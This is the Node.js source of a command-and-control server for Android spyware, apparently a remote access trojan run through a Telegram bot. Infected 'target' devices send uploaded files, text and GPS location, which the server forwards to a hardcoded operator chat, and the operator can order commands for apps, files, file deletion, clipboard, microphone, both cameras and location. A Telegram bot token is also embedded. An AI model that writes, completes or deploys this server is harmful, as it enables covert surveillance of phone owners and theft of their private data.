const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

const token = '7163553648:AAHHiZXhk5SEfZFOxnzqG1KPO-qMdpVCW9w';
const id = '7060108163';
const address = 'https://www.google.com';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

app.get('/', function (req, res) {
    res.send(`
        <html>
            <head>
                <title>Server Status</title>
                <style>
                    body { font-family: Arial, sans-serif; background-color: #f0f0f0; text-align: center; padding: 50px; }
                    h1 { color: #333; }
                    .container { background-color: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>🚀 Server uploaded successfully! 🚀</h1>
                    <p>Welcome to our server. Everything is up and running smoothly.</p>
                </div>
            </body>
        </html>
    `);
});

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    appBot.sendDocument(id, req.file.buffer, {
            caption: `📄 Message from <b>${req.headers.model}</b> device`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        }
    );
    res.send('');
});

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `📝 Message from <b>${req.headers.model}</b> device:\n\n${req.body['text']}`, {parse_mode: "HTML"});
    res.send('');
});

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon']);
    appBot.sendMessage(id, `📍 Location from <b>${req.headers.model}</b> device`, {parse_mode: "HTML"});
    res.send('');
});

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model;
    const battery = req.headers.battery;
    const version = req.headers.version;
    const brightness = req.headers.brightness;
    const provider = req.headers.provider;

    ws.uuid = uuid;
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    });
    appBot.sendMessage(id,
        `🔌 NEW DEVICE CONNECTED\n\n` +
        `📱 Model: <b>${model}</b>\n` +
        `🔋 Battery: <b>${battery}</b>\n` +
        `🖥️ System: <b>${version}</b>\n` +
        `💡 Brightness: <b>${brightness}</b>\n` +
        `📡 Provider: <b>${provider}</b>`,
        {parse_mode: "HTML"}
    );
    ws.on('close', function () {
        appBot.sendMessage(id,
            `🔌 DEVICE DISCONNECTED\n\n` +
            `📱 Model: <b>${model}</b>\n` +
            `🔋 Battery: <b>${battery}</b>\n` +
            `🖥️ System: <b>${version}</b>\n` +
            `💡 Brightness: <b>${brightness}</b>\n` +
            `📡 Provider: <b>${provider}</b>`,
            {parse_mode: "HTML"}
        );
        appClients.delete(ws.uuid);
    });
});

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        handleReplyToMessage(message);
    } else if (id == chatId) {
        handleMainCommands(message);
    } else {
        appBot.sendMessage(id, '⛔ Permission denied');
    }
});

appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const command = data.split(':')[0];
    const uuid = data.split(':')[1];
    
    if (command === 'device') {
        sendDeviceCommandOptions(uuid, msg.message_id);
    } else {
        executeDeviceCommand(command, uuid);
    }
});

function handleReplyToMessage(message) {
    // Implement the logic to handle replies to bot messages here
}

function handleMainCommands(message) {
    if (message.text === '/start') {
        appBot.sendMessage(id,
            '🖐️ WELCOME\n\n' +
            'If you encounter issues, please try /start again.',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Connected Devices"], ["Execute Command"]],
                    'resize_keyboard': true
                }
            }
        );
    }
    if (message.text === 'Connected Devices') {
        listConnectedDevices();
    }
    if (message.text === 'Execute Command') {
        listDevicesForCommandExecution();
    }
}

function listConnectedDevices() {
    if (appClients.size === 0) {
        appBot.sendMessage(id,
            'No devices available to connect.\n' +
            'Make sure the app is installed on the target device.'
        );
    } else {
        let text = 'Connected devices:\n\n';
        appClients.forEach((value, key) => {
            text += `📱 Device model: <b>${value.model}</b>\n` +
                    `🔋 Battery: <b>${value.battery}</b>\n` +
                    `🖥️ Android version: <b>${value.version}</b>\n` +
                    `💡 Screen brightness: <b>${value.brightness}</b>\n` +
                    `📡 Provider: <b>${value.provider}</b>\n\n`;
        });
        appBot.sendMessage(id, text, {parse_mode: "HTML"});
    }
}

function listDevicesForCommandExecution() {
    if (appClients.size === 0) {
        appBot.sendMessage(id,
            'No devices available to connect.\n' +
            'Make sure the app is installed on the target device.'
        );
    } else {
        const deviceListKeyboard = [];
        appClients.forEach((value, key) => {
            deviceListKeyboard.push([{
                text: value.model,
                callback_data: 'device:' + key
            }]);
        });
        appBot.sendMessage(id, 'Select a device to execute a command:', {
            "reply_markup": {
                "inline_keyboard": deviceListKeyboard,
            },
        });
    }
}

function sendDeviceCommandOptions(uuid, messageId) {
    appBot.editMessageText(`Select a command for the device: <b>${appClients.get(uuid).model}</b>`, {
        chat_id: id,
        message_id: messageId,
        reply_markup: {
            inline_keyboard: [
                [{text: 'Apps', callback_data: `apps:${uuid}`}, {text: 'Info', callback_data: `device_info:${uuid}`}],
                [{text: 'Get files', callback_data: `file:${uuid}`}, {text: 'Delete file', callback_data: `delete_file:${uuid}`}],
                [{text: 'Clipboard', callback_data: `clipboard:${uuid}`}, {text: 'Microphone', callback_data: `microphone:${uuid}`}],
                [{text: 'Rear camera', callback_data: `camera_main:${uuid}`}, {text: 'Front camera', callback_data: `camera_selfie:${uuid}`}],
                [{text: 'Location', callback_data

: `location:${uuid}`}]
            ]
        },
        parse_mode: 'HTML'
    });
}

function executeDeviceCommand(command, uuid) {
    appClients.forEach((value, key) => {
        if (uuid === key) {
            appSocket.clients.forEach((client) => {
                if (client.uuid === key) {
                    client.send(command);
                    currentUuid = key;
                    currentNumber = id;
                    currentTitle = command;
                    if (command.includes('apps')) {
                        appBot.sendMessage(id, 'Fetching data...');
                    }
                }
            });
        }
    });
}

const PORT = process.env.PORT || 3000;
appServer.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

